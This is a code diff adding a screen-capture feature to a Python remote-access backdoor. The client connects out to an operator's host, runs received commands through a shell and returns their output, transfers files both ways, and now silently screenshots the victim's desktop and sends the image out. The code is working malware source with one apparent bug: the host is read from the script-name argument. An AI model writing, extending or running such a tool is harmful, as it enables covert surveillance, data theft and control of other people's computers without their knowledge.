@@ -5,6 +5,9 @@ import os
 import base64
 import time
 import random
+import shutil
+import tempfile
+import pyscreenshot
 
 RECV_BYTE = 1024
 
@@ -53,6 +56,14 @@ def receive_file(s, file_path):
     f.close()
 
 
+def screen_capture(s):
+    temp_path = tempfile.mkdtemp()
+    img_path = temp_path + '/img.jpg'
+    pyscreenshot.grab().save(img_path, 'JPEG')
+    send_file(s, img_path)
+    shutil.rmtree(temp_path)
+
+
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((sys.argv[0], int(sys.argv[1])))
@@ -73,6 +84,8 @@ def connect():
             send_file(s, args)
         elif 'upload' in action:
             receive_file(s, args)
+        elif 'screencap' in action:
+            screen_capture(s)
         else:
             cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             s.send(cmd.stdout.read())
